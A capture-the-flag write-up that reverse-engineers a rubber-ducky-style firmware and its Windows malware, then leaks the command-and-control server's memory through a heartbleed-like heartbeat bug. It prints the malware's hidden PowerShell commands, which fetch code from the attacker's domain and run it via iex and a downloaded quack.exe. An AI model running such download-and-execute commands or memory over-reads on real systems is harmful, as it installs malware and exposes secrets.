# Quack the Quackers - HackTM 2020 Quals  
## Introduction

Quack the Quackers is a pwn task.

A company was compromised with a device similar to a rubber ducky (Hence the  
duck references.). We are given a memory dump of this device.

The task consists of two parts : the first consists of reverse-engineering the  
memory dump of the device, download the malware and analyze it. The second  
consists of exploiting a vulnerability in the malware's command and control  
(CnC) server.

## Reverse-engineering of the firmware

The device is said to be a `Digispark`. The firmware contains a mention of  
`Digistump` and `Digispark`.

The [official wiki](http://digistump.com/wiki/digispark/tutorials/programming)  
makes several mentions of `AVR` and `Attiny`.

Nobody wants to reverse AVR. Calling `strings` on the firmware only yields a  
very long string that looks like `QUAAAACK`. All the other strings are  
gibberish.

After importing the firmware in Ghidra and wandering around, a particular  
function caught our attention: the function at offset 0x600 performs  
comparisons of a variable with 'Q', 'A', 'C', 'K' and '!'.

The firmware implements a virtual machine. The instruction ribbon being the
long  
quack-like string, and the function at 0x600 executes each instructions.

The `U` and `K` instructions are straightforward: they respectively increment  
and decrement an accumulator register. (the `Y` register)

The `A` instruction is a bit more complicated. It performs a multiplication of  
the accumulator by itself, using a double-and-add algorithm. It effectively  
squares the accumulator.

The `Q` and `!` instructions are only present once : at the beginning and the  
end of the ribbon. It is very likely that they set up.

The `C` instruction is more frequent than `Q` and `!`. Keeping in mind the  
original purpose of the device (i.e. emulate an HID keyboard and send key  
presses), one can make an educated guess that this opcode, by a process of  
elimination, is the one responsible for sending a keystroke.

These hypothesis can be confirmed by writing a quick interpretor for this  
virtual machine (`decode.php`). The keystrokes sent are the following:  
```powershell  
powershell -noprofile -windowstyle hidden -command "iwr
nmdfthufjskdnbfwhejklacms.xyz/-ps|iex"  
```

This is a command that starts an hidden instsance powershell, makes it
download  
a link (`iwr` is an alias to `Invoke-WebRequest`) and execute it (`iex` is an  
alias to `Invoke-Expression`).

The `-ps` file contains a similar payload:  
```powershell  
iwr nmdfthufjskdnbfwhejklacms.xyz/quack.exe -outfile $env:temp/quack.exe  
Start-Process -WindowStyle hidden -FilePath $env:temp/quack.exe  
```

This payload download a `quack.exe` file, and runs it.

## Reverse-engineering of the Windows malware

The second part of this malware is a Windows binary. Importing it in Ghidra  
reveals that this binary connects to a remote server:  
`nmdfthufjskdnbfwhejklacms.xyz` on port 19834 (0x4D7A, obfuscated as `MZ`)

A mix of static analysis and packet-sniffing was used to understand the
network  
protocol used by the malware. It consists of 3 packets:  
1. heartbeat (`@`): sends data, server responds with the same data  
2. list (`L`): sends a list of files in the current directory, server responds  
  with a (random?) filename from this list  
3. file (`f`): sends the first 255 bytes of a file selected by the server (sent  
  after L)

The heartbeat feature looks awfully like TLS's hearbeat feature, which was  
vulnerable to CVE-2014-0160 (dubbed `heartbleed`).

By sending a heartbeat packet of size 255, with no data, and closing the
sending  
end of the socket, the remote server will reply with data that has not been  
cleared.

```  
$ ./heartbleed.php | xxd  
00000000: 00 00 00 00 00 00 00 00 54 20 43 4f 4d 50 41 4e  ........T COMPAN  
00000010: 59 20 53 45 43 52 45 54 3a 20 48 61 63 6b 54 4d  Y SECRET: HackTM  
00000020: 7b 51 75 34 63 6b 5f 6d 33 5f 62 34 63 6b 5f 62  {Qu4ck_m3_b4ck_b  
00000030: 34 62 79 21 7d 48 41 54 2e 20 4c 75 63 61 73 20  4by!}HAT. Lucas  
00000040: 72 65 71 75 65 73 74 73 20 74 68 65 20 48 61 63  requests the Hac  
00000050: 6b 54 4d 7b 51 75 34 63 6b 5f 6d 33 5f 62 34 63  kTM{Qu4ck_m3_b4c  
00000060: 6b 5f 62 34 62 79 21 7d 20 70 61 67 65 2e 20 45  k_b4by!} page. E  
00000070: 76 65 20 28 61 64 6d 69 6e 69 73 74 72 61 74 6f  ve (administrato  
00000080: 72 29 20 77 61 6e 74 73 20 74 6f 20 73 65 74 20  r) wants to set  
00000090: 74 68 65 20 73 65 72 76 65 72 27 73 20 6d 61 73  the server's mas  
000000a0: 74 65 72 20 6b 65 79 20 74 6f 20 48 61 63 6b 54  ter key to HackT  
000000b0: 4d 7b 51 75 34 63 6b 5f 6d 33 5f 62 34 63 6b 5f  M{Qu4ck_m3_b4ck_  
000000c0: 62 34 62 79 21 7d 2e 20 49 73 61 62 65 6c 20 77  b4by!}. Isabel w  
000000d0: 61 6e 74 73 20 70 61 67 65 73 20 61 62 6f 75 74  ants pages about  
000000e0: 20 48 61 63 6b 54 4d 7b 51 75 34 63 6b 5f 6d 33   HackTM{Qu4ck_m3  
000000f0: 5f 62 34 63 6b 5f 62 34 62 79 21 7d 2e 7a 7a     _b4ck_b4by!}.zz  
```

**Flag**: `HackTM{Qu4ck_m3_b4ck_b4by!}`

## Appendices  
### decode.php  
```php  
#!/usr/bin/php  

Original writeup
(https://github.com/TFNS/writeups/blob/master/2020-02-01-HackTM/Quack%20the%20Quackers/README.md).